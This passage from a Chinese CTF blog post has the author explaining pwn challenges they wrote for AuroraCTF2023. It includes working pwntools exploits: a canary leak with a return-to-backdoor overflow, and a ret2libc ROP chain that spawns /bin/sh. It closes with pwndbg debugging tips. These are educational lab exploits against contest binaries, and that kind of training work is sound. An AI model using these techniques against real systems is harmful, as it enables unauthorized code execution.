+<p>可以看到secret是bss段的一个全局变量。</p>
+<p>至此思路基本已经清晰了，那就是绕过canary溢出返回到后门函数，并想办法将secret修改成/bin/sh</p>
+<p><img src="image-20231024100929056.png" alt="main"></p>
+<p>在主函数中我们可以看到Login success后会直接将栈上信息整个输出，由于printf字符串会在遇到\x00截断，因此直接输出是无法泄露canary的。</p>
+<p><s>那么如何泄露canary呢，这里留个悬念，剩下的流程看下面的exp可以思考下为什么。不会再来摇我（</s></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;actf-node.szu.moe&#x27;</span>, <span class="number">10061</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401207</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span>-<span class="number">8</span>) + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Account name: &#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Password: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span>-<span class="number">8</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(backdoor)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To thank for your help, Tokoyomi will give you what you want.&#x27;</span>, payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="8tiamatf-minor"><a class="markdownIt-Anchor" href="#8tiamatf-minor"></a> 8.TiamaT:F minor</h2>
+<p>考点：ret2libc</p>
+<p>就是一道非常常规的ret2libc，要做出来参考其他ret2libc题目的解法解这道题就行，异曲同工。</p>
+<p><strong>注意一点：在本地调试的时候要将给出的libc(如果有的话)先patch了。</strong></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;actf-node.szu.moe&#x27;</span>, ?????)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400743</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr =  elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(pop_rdi_ret) +  p64(puts_got)  + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Show me your power!\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006d3</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Show me your power!\n&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="pwndbg调试"><a class="markdownIt-Anchor" href="#pwndbg调试"></a> Pwndbg调试</h2>
+<p>pwndbg是做pwn题离不开的一个十分重要的工具，熟练应用pwndbg调试程序是你能成功getshell的一个重要保障。</p>
+<p>pwndbg基本操作指令：这方面的介绍很多，根据需要自行搜索了解。下面放个例子</p>
+<p><a href="https://www.cnblogs.com/murkuo/p/15965270.html" target="_blank">pwndbg基本操作</a></p>
+<p>gdb.attach()：在pwntools脚本中调用gdb调试，通过传入gdb脚本可以让程序断点在指定位置。</p>
+<p><s>注意：gdb调试只能在打本地的时候用，打远程请务必注释掉gdb调试，否则会报错!</s></p>
+<p>例如:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *0x401124&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>注意地址要是十六进制的，前面要加*</p>
+<p>如果是开了pie保护的程序，使用gdb.attach()的方式如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">&#x27;b *$rebase(0x1124)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <blockquote class="article-copyright">
+    <p><strong>本文作者：</strong>*月遇丛雲花遇風* @ T3uk1 の 庭院</p>
+    <p><strong>本文链接：</strong><a href="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/">https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/</a></p>
+    <p><strong>本文标题：</strong>记第一次出Pwn题——AuroraCTF2023第一批Pwn</p>
+    
+    
+    <p><strong>本文版权：</strong>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><span class="icon-creative-commons"></span>BY-NC-SA</a> 许可协议。转载请注明出处！</p>
+  </blockquote>
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/covers/72235081_p0_master1200.jpg" data-sizes="auto" alt="使用docker部署pwn题" class="lazyload">
+          
+        
+        <a href="/2023/10/31/%E4%BD%BF%E7%94%A8docker%E9%83%A8%E7%BD%B2pwn%E9%A2%98/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            使用docker部署pwn题
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/ec43126fgy1gwg9veeogtj224r1i9u0y.jpg" data-sizes="auto" alt="hexo添加版权声明" class="lazyload">
+        
+      
+      <a href="/2023/10/30/hexo%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          hexo添加版权声明
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BApwn%E9%A2%98auroractf2023%E7%AC%AC%E4%B8%80%E6%89%B9pwn"><span class="toc-number">1.</span> <span class="toc-text"> 记第一次出Pwn题——AuroraCTF2023第一批Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1nc"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2nc2"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.nc2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E5%8F%A3%E7%AE%97master"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.口算Master</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E5%AF%B0%E5%AE%87%E8%9D%97%E7%81%BE"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.寰宇蝗灾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E5%B9%BD%E5%B9%BD%E5%AD%90%E7%9A%84%E9%A3%9F%E7%89%A9"><span class="toc-number">1.5.</span> <span class="toc-text"> 5.幽幽子的食物</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E5%B9%BD%E5%B9%BD%E5%AD%90%E7%9A%84%E9%A3%9F%E7%89%A92"><span class="toc-number">1.6.</span> <span class="toc-text"> 6.幽幽子的食物2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7starrail"><span class="toc-number">1.7.</span> <span class="toc-text"> 7.StarRail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8tiamatf-minor"><span class="toc-number">1.8.</span> <span class="toc-text"> 8.TiamaT:F minor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwndbg%E8%B0%83%E8%AF%95"><span class="toc-number">1.9.</span> <span class="toc-text"> Pwndbg调试</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="*月遇丛雲花遇風*" class="lazyload">
+  <div class="sidebar-author-name">*月遇丛雲花遇風*</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">15</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=1027600674@qq.com itemprop="url" target="_blank" aria-label="email"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/t3uk1 itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info">
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2022-2024
+        <span class="footer-info-sep"></span>
+        *月遇丛雲花遇風*
+      </div>
+      
+        <div>
+          基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          103.3k
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          07:53
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BApwn%E9%A2%98auroractf2023%E7%AC%AC%E4%B8%80%E6%89%B9pwn"><span class="toc-number">1.</span> <span class="toc-text"> 记第一次出Pwn题——AuroraCTF2023第一批Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1nc"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2nc2"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.nc2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E5%8F%A3%E7%AE%97master"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.口算Master</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E5%AF%B0%E5%AE%87%E8%9D%97%E7%81%BE"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.寰宇蝗灾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E5%B9%BD%E5%B9%BD%E5%AD%90%E7%9A%84%E9%A3%9F%E7%89%A9"><span class="toc-number">1.5.</span> <span class="toc-text"> 5.幽幽子的食物</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E5%B9%BD%E5%B9%BD%E5%AD%90%E7%9A%84%E9%A3%9F%E7%89%A92"><span class="toc-number">1.6.</span> <span class="toc-text"> 6.幽幽子的食物2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7starrail"><span class="toc-number">1.7.</span> <span class="toc-text"> 7.StarRail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8tiamatf-minor"><span class="toc-number">1.8.</span> <span class="toc-text"> 8.TiamaT:F minor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwndbg%E8%B0%83%E8%AF%95"><span class="toc-number">1.9.</span> <span class="toc-text"> Pwndbg调试</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="*月遇丛雲花遇風*" class="lazyload">
+  <div class="sidebar-author-name">*月遇丛雲花遇風*</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">15</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=1027600674@qq.com itemprop="url" target="_blank" aria-label="email"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/t3uk1 itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <div class="reimu-search-input-icon"></div>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+          <div class="popup-btn-close"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js"></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.2.4' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
